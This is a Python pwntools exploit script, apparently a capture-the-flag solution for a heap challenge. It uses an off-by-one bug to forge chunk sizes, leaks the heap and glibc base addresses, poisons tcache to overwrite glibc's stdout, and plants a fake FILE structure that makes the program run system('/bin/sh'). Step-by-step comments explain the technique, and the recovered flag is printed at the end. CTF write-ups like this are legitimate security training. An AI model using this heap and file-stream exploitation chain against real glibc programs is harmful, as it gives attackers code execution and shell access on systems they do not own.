import ctypes
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('remote.infoseciitr.in', 8006)

# replicate PRNG srand(time(NULL))
libc = ctypes.CDLL('libc.so.6')
libc.time.argtypes = [ctypes.POINTER(ctypes.c_long)]
libc.srand.argtypes = [ctypes.c_uint]
current_time = ctypes.c_long()
libc.time(ctypes.byref(current_time))
libc.srand(ctypes.c_uint(current_time.value))
libc.rand.restype = ctypes.c_int

# spells array has 9 spells in total, but only first 8 are used because spell number is retrieved as 0-7 by rand() % 8
# string lengths of first 8 spells are 0x9, 0x8, 0x12, 0xb, 0x18, 0x19, 0x15, 0x10 respectively
spells = ["amaterasu", "Rasengan", "Shadow_Clone_Jutsu", "Sand_Coffin", "Rasenshuriken_Expansion!", "arcane_blast_of_the_void!", "planetary_devastation", "etherial_barrier", "lightning_chain"]

# mini_regex_match function can match "?", "+", ".", "^", "$", and return matched characters count

# dodge and learn a spell:
# 1. fuzz PRNG by dodging continuously until rand() % 8 is equal to given spell number
# 2. call learn function with given place index (0-7, unused) and corresponding spells[spell_number]; within learn function:
# 3. call mini_regex_match function (only "?", "+", ".", "^", "$" supported) with corresponding spells[spell_number] and given guess spell (0x2f bytes at most and null terminated, strlen(guess_spell) >= strlen(spells[spell_number])) to get non-negative matched characters count (matched_chars >= 0)
# 4. malloc a chunk with size of matched characters count
# 5. copy string length of spells[spell_number] bytes from given guess spell to chunk (off-by-one to fake next chunk size possible if appropriate)
def dodge_learn_spell(spell_number, place_index, guess_spell):
    while libc.rand() % 8 != spell_number:
        p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"what's the place for your spell\n>> ", str(place_index).encode())
    p.sendlineafter(b"Enter your guess: ", guess_spell)
# summarize following methodsmainly used in script:
# dodge_learn_spell(1, i, spells[1].encode()): malloc a chunk of size 0x20
# dodge_learn_spell(5, i, spells[5].encode()): malloc a chunk of size 0x30
# dodge_learn_spell(5, i, spells[5][:0x18].encode()+b'\xf1?'): malloc a chunk of size 0x20 and trigger off-by-one to fake next chunk size to 0xf0

# forget a spell:
# 1. call forget function with given place index (0-7, used), within forget function:
# 2. free chunk corresponding to given place index and set its pointer to NULL
def forget_spell(place_index):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"what's the place for your spell\n>> ", str(place_index).encode())

# remember a spell:
# 1. call remember function with given place index (0-7, used), within remember function:
# 2. print out value in chunk size field - 8 of chunk data corresponding to given place index (addresses leakage with fake chunk size field possible if appropriate)
def remember_spell(place_index):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b"what's the place for your spell\n>> ", str(place_index).encode())
    p.recvuntil(b"here is your spell >> ")
    return p.recvline().strip()

# add a special spell (this can be used only once):
# 1. call add_special_spell function with given place index (0-7, unused)
# 2. malloc a chunk of given spell length (0-0x2f)
# 3. copy given spell length (0-0x2f) bytes from given special spell (0x2f bytes at most and null terminated) to chunk (heap overflow within overlapping chunks possible if appropriate)
def add_special_spell(place_index, spell_length, special_spell):
    p.sendlineafter(b">> ", b'5')
    p.sendlineafter(b"what's the place for your spell\n>> ", str(place_index).encode())
    p.sendlineafter(b"length of your spell(1-48) >> ", str(spell_length).encode())
    p.sendlineafter(b"Enter your special spell: ", special_spell)

# execute read(0, malloc(bytes: 0xe8), 0xe8) twice and exit program through exit function
def exit_program(message1, message2):
    p.sendlineafter(b">> ", b'6')
    p.sendafter(b"before leaving you need to summon all your magic and knowledge to me >> ", message1)
    p.sendafter(b"hey hey do you really think you can trick me, where are you going without telling me your special spell >> ", message2)

glibc_e = ELF('./libc.so.6')

# Stage 1: heap feng shui for off-by-one to produce fake chunk size of 0xf0 to leak heap base address
# malloc and free 7 chunks of size 0x20 to fill tcache bin of size 0x20 for later off-by-one usage (must be chunks of size 0x20 because off-by-one can only be triggered from chunk of size 0x20)
for i in range(7):
    dodge_learn_spell(1, i, spells[1].encode()) # i: heap_base_addr+0x2a0+0x20*i
for i in range(7):
    forget_spell(i) # i: heap_base_addr+0x2a0+0x20*i
# now tcache bin of size 0x20 looks like heap_base_addr+0x360 -> heap_base_addr+0x340 -> heap_base_addr+0x320 -> heap_base_addr+0x300 -> heap_base_addr+0x2e0 -> heap_base_addr+0x2c0 -> heap_base_addr+0x2a0
# trigger off-by-one to produce 6 chunks of fake size 0xf0
dodge_learn_spell(1, 6, spells[1].encode()) # 6: heap_base_addr+0x360
for i in range(6):
    dodge_learn_spell(5, 5-i, spells[5][:0x18].encode()+b'\xf1?') # 5-i: heap_base_addr+0x2a0+0x20*(5-i)
# now chunk 1 to chunk 6 at heap_base_addr+0x2c0, heap_base_addr+0x2e0, heap_base_addr+0x300, heap_base_addr+0x320, heap_base_addr+0x340, heap_base_addr+0x360 are of fake size 0xf0
# free 6 chunks of fake size 0xf0 into tcache bin of size 0xf0
forget_spell(6) # 6: heap_base_addr+0x360
heap_base_addr = u64(remember_spell(5)[0x20:0x28])<<12 # 5: heap_base_addr+0x340 / print out 0xe8 bytes (fake chunk size field - 8) from heap_base_addr+0x340 to leak shifted heap address at heap_base_addr+0x360
log.info(f"heap base address: {hex(heap_base_addr)}")
for i in range(5):
    forget_spell(5-i) # 5-i: heap_base_addr+0x2a0+0x20*(5-i)
# now tcache bin of size 0xf0 looks like heap_base_addr+0x2c0 -> heap_base_addr+0x2e0 -> heap_base_addr+0x300 -> heap_base_addr+0x320 -> heap_base_addr+0x340 -> heap_base_addr+0x360

# Stage 2: heap feng shui for off-by-one to produce fake chunk in unsorted bin to leak glibc base address
# malloc a chunk of size 0x20 for later off-by-one usage (must be chunk of size 0x20 because off-by-one can only be triggered from chunk of size 0x20)
dodge_learn_spell(1, 1, spells[1].encode()) # 1: heap_base_addr+0x380
# malloc 3 chunks of size 0x20 and 3 chunks of size 0x30 for later off-by-one usage (must be 3 chunks of size 0x20 and 3 chunks of size 0x30 because 0x20*3+0x30*3=0xf0)
for i in range(3):
    dodge_learn_spell(1, i+2, spells[1].encode()) # i+2: heap_base_addr+0x3a0+0x20*i
for i in range(3):
    dodge_learn_spell(5, i+5, spells[5].encode()) # i+5: heap_base_addr+0x400+0x30*i
# free chunk 0 of size 0x20 to make room for new chunk
forget_spell(0) # 0: heap_base_addr+0x2a0
# malloc a chunk of size 0x30 for later off-by-one usage (must be chunk of size 0x30 because tcache bin of size 0x30 is empty)
dodge_learn_spell(5, 0, spells[5].encode()) # 0: heap_base_addr+0x490
# trigger off-by-one to produce chunk of fake size 0xf0
forget_spell(3) # 3: heap_base_addr+0x3c0
dodge_learn_spell(5, 3, spells[5][:0x18].encode()+b'\xf1?') # 3: heap_base_addr+0x3c0
# now chunk 4 at heap_base_addr+0x3e0 is of fake size 0xf0
# free chunk of fake size 0xf0 into tcache bin of size 0xf0
forget_spell(4) # 4: heap_base_addr+0x3e0
# now tcache bin of size 0xf0 looks like heap_base_addr+0x3e0 -> heap_base_addr+0x2c0 -> heap_base_addr+0x2e0 -> heap_base_addr+0x300 -> heap_base_addr+0x320 -> heap_base_addr+0x340 -> heap_base_addr+0x360
# trigger off-by-one to produce chunk of fake size 0xf0
forget_spell(1) # 1: heap_base_addr+0x380
dodge_learn_spell(5, 1, spells[5][:0x18].encode()+b'\xf1?') # 1: heap_base_addr+0x380
# now chunk 2 at heap_base_addr+0x3a0 is of fake size 0xf0
# free chunk of fake size 0xf0 into tcache bin of size 0xf0
forget_spell(2) # 2: heap_base_addr+0x3a0
# now unsorted bin looks like heap_base_addr+0x3a0, placing glibc addresses at heap_base_addr+0x3a0 and heap_base_addr+0x3a8
# malloc a chunk of size 0x20 to clear tcache bin of size 0x20
dodge_learn_spell(1, 2, spells[1].encode()) # 2: heap_base_addr+0x2a0
# malloc a chunk of size 0x20 splitted from unsorted bin chunk to leak glibc address
dodge_learn_spell(1, 4, spells[1].encode()) # 4: heap_base_addr+0x3a0
glibc_base_addr = u64(remember_spell(4)[8:0x10])-(glibc_e.symbols['main_arena']+320) # 4: heap_base_addr+0x3a0 / print out 0x18 bytes (chunk size field - 8) from heap_base_addr+0x3a0 to leak glibc address at heap_base_addr+0x3a8
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 3: heap feng shui for heap overflow within overlapping chunks to tcache poisoning for fsop
# free chunk 0 of size 0x30 to make room for new chunk
forget_spell(0) # 0: heap_base_addr+0x490
# malloc a chunk of size 0x40 splitted from unsorted bin chunk to produce overlapping chunk for tcache poisoning
add_special_spell(0, 0x2f, p64(0)*4+p64((glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])^(heap_base_addr+0x3f0)>>12)) # 0: heap_base_addr+0x3c0 / overwrite fd pointer of chunk at heap_base_addr+0x3e0 in tcache bin of size 0xf0
# now tcache bin of size 0xf0 looks like heap_base_addr+0x3e0 -> glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']
# perform tcache poisoning for fsop
# execution flow of fake file structure: puts->_IO_wfile_underflow->__libio_codecvt_in
fake_file = FileStructure(0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake_file._IO_buf_base = u64(b'/bin/sh\x00')
fake_file._IO_backup_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake_file._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake_file._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake_file._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake_file.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x28)+p64(0)*3
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
exit_program(b'junk', bytes(fake_file)) # glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'] / trigger fsop to call system("/bin/sh\x00")

# it should be noted that the key points of this heap feng shui are:
# 1. fill up tcache bin of size 0xf0 with 7 chunks and place another chunk of size 0xf0 into unsorted bin
# 2. fake chunk in unsorted bin has to have valid previous chunk and next chunk to avoid potential heap errors
# 3. chunk of size 0xf0 in unsorted bin has to have a lower address than first chunk of size 0xf0 in tcache bin to ensure tcache poisoning

p.interactive()

# flag{I_4m_a_bad_c0d3r_c0u1dn't_3ven_writ3_regex_lol_br4ind3d_m3}